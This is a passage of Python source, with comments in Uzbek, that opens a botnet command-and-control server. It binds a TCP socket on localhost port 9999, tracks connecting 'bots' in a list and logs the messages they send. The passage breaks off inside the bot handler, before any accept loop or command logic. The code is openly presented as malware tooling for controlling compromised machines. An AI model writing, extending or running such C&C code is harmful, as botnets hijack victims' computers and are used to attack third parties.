import socket
import threading
import time
import requests
import logging
import sys

# Logging sozlash
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

# C&C Server
def run_server(host='127.0.0.1', port=9999):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(10)
    logging.info(f"C&C Server {host}:{port} da ishga tushdi")

    bots = []

    def handle_bot(bot_socket, addr):
        logging.info(f"Yangi bot ulandi: {addr}")
        bots.append(bot_socket)

        while True:
            try:
                data = bot_socket.recv(1024).decode()
                if not data:
                    logging.info(f"Bot {addr} uzildi")
                    bots.remove(bot_socket)
                    break
                logging.info(f"Bot {addr} dan xabar: {data}")
            except:
                bots.remove(bot_socket)